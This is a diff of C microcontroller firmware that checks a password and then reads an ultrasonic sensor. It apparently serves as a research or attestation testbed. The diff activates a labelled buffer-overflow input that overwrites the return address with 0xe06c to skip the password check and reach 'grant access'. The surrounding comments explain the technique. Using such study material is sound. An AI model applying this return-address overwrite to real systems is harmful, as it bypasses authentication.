@@ -20,25 +20,25 @@
 #include <stdio.h>
 #include "hardware.h"
 
+// Password defines
 #define size            4
 #define user_size       5
-#define user_bad_size   9 
+#define attack_size   9 
 #define cr              '\r'
 
+// Ultrasonic sensor 
 #define HIGH            0xffff
 #define LOW             0x0000
-
 #define ULT_PIN         0x02
 #define MAX_DURATION    1000
 #define TOTAL_READINGS  6
 
-#define STACK_BASE      0x6800
-
+// TARGET ADDRESS OF ATTACK: location of "access granted" -- 0xe06c
 #define TARGET_UPPER    0xe0
 #define TARGET_LOWER    0x6c
 
+// functions
 void acfa_exit();
-//
 int my_memcmp(const char* s1, const char* s2, int length);
 char waitForPassword();
 void read_data(char * entry);
@@ -50,11 +50,13 @@ long getUltrasonicReading(void);
 // Password
 char pass[4] = {'a', 'b', 'c', 'd'};
 
-// Normal
-char user_input[5] = {'a', 'b', 'c', 'd', '\r'};
+// Simulate non-attack input
+// char user_input[5] = {'a', 'b', 'c', 'd', '\r'};
 
-// Buffer overflow -- jump to 'grant access' when password is wrong
-// char user_input[user_bad_size] = {0x01, 0x02, 0x03, 0x04, 0x00, 0x04, TARGET_LOWER, TARGET_UPPER, '\r'};
+// Simulate Buffer overflow attack
+// Since the code waits for '\r', the return address can be overwritten to skip the password check
+// This input includes an incorrect password jump to 'grant access' after the return from waitForPassword
+char user_input[attack_size] = {0x01, 0x02, 0x03, 0x04, 0x00, 0x04, TARGET_LOWER, TARGET_UPPER, '\r'};
 
 // Output data
 long ult_readings[TOTAL_READINGS] = {0,0,0,0,0,0};
@@ -66,10 +68,10 @@ char waitForPassword(){
 
     read_data(entry);
 
-    char total;
+    char total = 0;
     unsigned int i;
     for(i=0; i<4; i++){
-        total &= (pass[i] & ~(user_input[i]));    
+        total |= (pass[i] ^ entry[i]);
     }
 
     return total;
@@ -85,11 +87,12 @@ void read_data(char * entry){
     }
 }
 //---------- Gather ultrasonic sensor readings ----------//
+// delay microseconds
 void delay(unsigned int us){
     int i;
     for(i=0; i<us; i++);
 }
-
+// measures total duration of pulse(s) over a max duration
 long pulseIn(void){
     unsigned long duration = 0;
     int i = 0;
@@ -99,7 +102,7 @@ long pulseIn(void){
     }
     return duration;
  }
-
+// get reading from ultrasonic sensor, connected to PORT2
 long getUltrasonicReading(void){
     // Set as output
     P2DIR |= ULT_PIN;
@@ -127,17 +130,22 @@ long getUltrasonicReading(void){
 int main(void)
 {
 
+    // Enable GPIO
     P1DIR = 0xff;  // Onboard LED                     
     P2DIR = 0x00;  // Port 2.0-2.7 = Ultrasonic Sensor on P2.2
     
+    // Call wait for password, 'total' determines validity of password
     char total = waitForPassword();
 
-    if(total != 0){ // Deny access
+    if(total != 0){
+        // Deny access
         P1OUT = 0x00;
     }
-    else { // Grant access
+    else { 
+        // Grant access
         P1OUT = 0x01;
         unsigned char i = 0;
+        // After granting access, collect readings from sensor
         while(i < TOTAL_READINGS){
             ult_readings[i] = getUltrasonicReading();
             i++;
